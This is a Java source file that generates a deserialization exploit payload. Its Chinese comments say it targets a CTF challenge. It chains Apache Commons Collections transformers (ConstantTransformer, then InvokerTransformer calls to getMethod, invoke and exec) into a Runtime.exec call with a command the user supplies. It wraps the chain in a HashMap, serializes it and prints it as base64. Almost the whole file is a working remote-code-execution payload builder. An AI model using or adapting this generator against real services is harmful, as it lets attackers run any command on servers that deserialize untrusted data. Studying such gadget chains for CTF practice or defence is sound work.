import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * Sink-pattern gadget builder (方案 1a).
 *
 * 针对 ctf-java-quote 这类「应用对反序列化对象的某字段调用 Transformer.transform」的
 * 自定义接线：应用把反序列化得到的 Map 放进 userConfig，随后 CacheProcessor.process(userConfig)
 * 取出 key="transformer" 的值强转为 Transformer 并逐条 cache 值调用 transformer.transform(...)。
 *
 * 因此 gadget 根只需是一个 Map，其 "transformer" 键的值为一条 commons-collections
 * ChainedTransformer 执行链（Runtime.exec）。这跟 ysoserial 的标准 gadget 图无关——
 * 是按「sink 调用模式」合成，不枚举任何函数名。
 *
 * 用法：java -cp commons-collections-3.1.jar:. GadgetBuilder "<command>"
 * 输出：base64 后的 Java 序列化流（以 AC ED 00 05 开头）。
 */
public class GadgetBuilder {

    public static void main(String[] args) throws Exception {
        String cmd = (args != null && args.length > 0 && !args[0].isEmpty())
                ? args[0]
                : "calc";

        Transformer[] transformers = new Transformer[]{
                // 无论输入是什么，恒返回 Runtime.class
                new ConstantTransformer(Runtime.class),
                // Runtime.class.getMethod("getRuntime")
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                // method.invoke(null) -> Runtime 实例
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                // runtime.exec(cmd)
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{cmd}),
        };
        ChainedTransformer chained = new ChainedTransformer(transformers);

        Map<String, Object> root = new HashMap<>();
        root.put("transformer", chained);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(root);
        }
        System.out.print(Base64.getEncoder().encodeToString(baos.toByteArray()));
    }
}
